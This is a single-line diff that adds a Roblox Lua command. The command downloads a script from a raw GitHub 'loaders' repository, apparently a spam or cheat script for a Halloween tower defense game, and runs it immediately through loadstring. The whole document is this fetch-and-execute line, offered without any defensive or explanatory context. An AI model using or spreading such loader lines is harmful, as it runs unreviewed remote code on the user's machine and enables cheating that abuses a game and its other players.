@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/halloween-vocaloid-tower-defense-spam3-7hw8utz8ofb5m9.lua"))()
